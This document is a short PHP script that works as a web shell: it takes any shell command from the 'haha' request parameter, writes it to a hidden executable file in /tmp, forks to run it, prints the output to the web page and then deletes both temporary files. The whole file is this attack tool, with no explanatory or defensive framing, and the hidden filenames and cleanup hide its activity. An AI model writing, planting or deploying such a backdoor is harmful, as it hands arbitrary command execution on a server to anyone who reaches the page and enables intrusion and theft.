<?php
    
    
if(!isset($_REQUEST[haha])){
    exit();
}

$out = "/tmp/.SK39s4LSI4l2xso~";
$in = "/tmp/.loS439sl4iLq~";
$c = "#!/usr/bin/env bash\n{$_REQUEST[haha]} > {$out}\n";
file_put_contents($in, $c);
chmod($in, 0777);

switch (pcntl_fork()) {
    case 0:
        $ret = pcntl_exec($in);
        exit("case 0");
    default:
        sleep(1);
        echo nl2br(file_get_contents($out));
        @unlink($out);
        @unlink($in);
        break;
}


